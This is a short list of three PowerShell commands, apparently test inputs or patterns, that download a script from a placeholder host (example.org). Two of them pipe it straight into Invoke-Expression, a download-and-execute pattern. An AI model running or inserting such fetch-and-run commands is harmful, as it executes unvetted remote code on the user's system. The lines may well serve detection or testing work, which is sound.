iwr https://example.org/i.ps1 | Invoke-Expression
IWR https://example.org/i.ps1 | IEX
Invoke-WebRequest https://example.org/i.ps1 -OutFile i.ps1
